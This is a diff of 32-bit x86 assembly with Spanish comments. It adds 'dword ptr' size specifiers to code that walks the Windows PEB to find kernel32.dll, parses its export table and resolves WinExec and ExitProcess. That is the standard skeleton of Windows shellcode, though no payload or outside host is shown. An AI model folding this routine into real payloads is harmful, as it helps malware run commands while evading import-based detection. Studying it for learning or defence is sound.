@@ -16,9 +16,9 @@ start:
     ; ========================
     ; 1. Obtener dirección del PEB
     ; ========================
-    mov eax, fs:[0x30]            ; EAX = PEB
-    mov eax, [eax + 0x0C]         ; EAX = PEB->Ldr
-    mov esi, [eax + 0x14]         ; ESI = &InMemoryOrderModuleList
+    mov eax, dword ptr fs:[0x30]            ; EAX = PEB
+    mov eax, dword ptr [eax + 0x0C]         ; EAX = PEB->Ldr
+    mov esi, dword ptr [eax + 0x14]         ; ESI = &InMemoryOrderModuleList
     
     ;lista enlazada, pasando de un puntero a otro (no de offset o indice en array)
     
@@ -28,22 +28,22 @@ start:
     ; ========================
     ; 2. Obtener base de kernel32.dll
     ; ========================
-    mov ebx, [esi + 0x10]         ; EBX = BaseAddress de kernel32.dll
+    mov ebx, dword ptr [esi + 0x10]         ; EBX = BaseAddress de kernel32.dll
 
     ; ========================
     ; 3. Obtener dirección de tabla de exportación
     ; ========================
-    mov eax, [ebx + 0x3C]         ; EAX = Offset PE Header (e_lfanew)
+    mov eax, dword ptr [ebx + 0x3C]         ; EAX = Offset PE Header (e_lfanew)
     add eax, ebx                  ; EAX = RVA PE Header + base
-    mov eax, [eax + 0x78]         ; RVA Export Table
+    mov eax, dword ptr [eax + 0x78]         ; RVA Export Table
     add eax, ebx                  ; EAX = Export Table VA
     mov edi, eax                  ; EDI = Export Directory
 
     ; ========================
     ; 4. Obtener Name Pointer Table
     ; ========================
-    mov ecx, [edi + 0x18]         ; NumberOfNames
-    mov edx, [edi + 0x20]         ; AddressOfNames (RVA array de punteros a strings)
+    mov ecx, dword ptr [edi + 0x18]         ; NumberOfNames
+    mov edx, dword ptr [edi + 0x20]         ; AddressOfNames (RVA array de punteros a strings)
     add edx, ebx                  ; EDX = VA de lista de nombres
 
 buscar_winexec:
@@ -78,9 +78,9 @@ found_winexec:
     ; ========================
     ; 5. Obtener índice del nombre encontrado
     ; ========================
-    mov ecx, [edi + 0x24]         ; AddressOfNameOrdinals
+    mov ecx, dword ptr [edi + 0x24]         ; AddressOfNameOrdinals
     add ecx, ebx
-    sub edx, [edi + 0x20]
+    sub edx, dword ptr [edi + 0x20]
     shr edx, 2                    ; índice = (posición * 4) / 4
     mov dx, [ecx + edx*2]         ; ordinal (WORD)
 
@@ -98,8 +98,8 @@ found_winexec:
     ; ========================
     ; 7. Buscar ExitProcess igual
     ; ========================
-    mov ecx, [edi + 0x18]         ; Reusar ExportDirectory
-    mov edx, [edi + 0x20]
+    mov ecx, dword ptr [edi + 0x18]         ; Reusar ExportDirectory
+    mov edx, dword ptr [edi + 0x20]
     add edx, ebx
 buscar_exit:
     push ecx
@@ -125,13 +125,13 @@ next_exit:
 found_exit:
     pop ecx
     pop edx
-    mov ecx, [edi + 0x24]
+    mov ecx, dword ptr [edi + 0x24]
     add ecx, ebx
-    sub edx, [edi + 0x20]
+    sub edx, dword ptr [edi + 0x20]
     shr edx, 2
     mov dx, [ecx + edx*2]
 
-    mov ecx, [edi + 0x1C]
+    mov ecx, dword ptr [edi + 0x1C]
     add ecx, ebx
     mov eax, [ecx + edx*4]
     add eax, ebx
